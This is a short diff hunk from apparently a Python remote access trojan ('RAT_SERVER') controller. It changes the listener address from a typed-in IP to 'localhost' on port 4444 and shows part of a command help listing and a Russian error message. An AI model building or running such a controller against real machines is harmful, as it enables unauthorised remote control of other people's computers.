@@ -493,7 +493,7 @@ readfile <file>           read from file
                 print('Ошибка команды - такой команды не существует!')
 
 
-rat = RAT_SERVER(input('>> your IP:'), 4444)
+rat = RAT_SERVER("localhost", 4444)
 
 if __name__ == '__main__':
     rat.build_connection()
